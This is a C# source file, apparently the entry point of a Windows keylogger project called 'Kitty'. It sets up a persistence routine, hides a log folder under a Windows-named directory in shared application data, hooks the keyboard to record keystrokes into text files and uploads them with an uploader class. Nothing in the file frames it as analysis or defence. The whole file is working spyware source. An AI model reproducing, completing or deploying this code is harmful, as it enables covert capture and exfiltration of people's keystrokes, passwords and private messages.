using Kitty.Stash;
using Kitty.Win32;
using System;
#if DEBUG
using System.Diagnostics;
#endif
using System.IO;
using System.Windows.Forms;

namespace Kitty
{
    class Program
    {
        static ApplicationMaintain applicationMaintain;
        static string keyloggerDir;

        static void MaintainApplication()
        {
            applicationMaintain = new ApplicationMaintain();
            applicationMaintain.MaintainAsync();
        }

        static void FindStashDirectory()
        {
            string appDataDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            keyloggerDir = Path.Combine(appDataDir, "Windows", Application.ProductName);
            if (!Directory.Exists(keyloggerDir))
                Directory.CreateDirectory(keyloggerDir);
        }

        static async void SetupKeylogger()
        {
            var stashProvider = new TextFileFactory(keyloggerDir);
            if (!Keylogger.Hook(stashProvider))
            {
#if DEBUG
                Debug.WriteLine("Keylogger setup error: " + Win32API.GetLastErrorAsMessage());
#endif
            }
            await new SimpleUploader(stashProvider).UploadAsync();
        }

        static void Main(string[] args)
        {
            MaintainApplication();
            FindStashDirectory();
            SetupKeylogger();
            ApplicationInformation.VerifyApplition();
            Application.Run();
            Keylogger.Unhook();
        }
    }
}
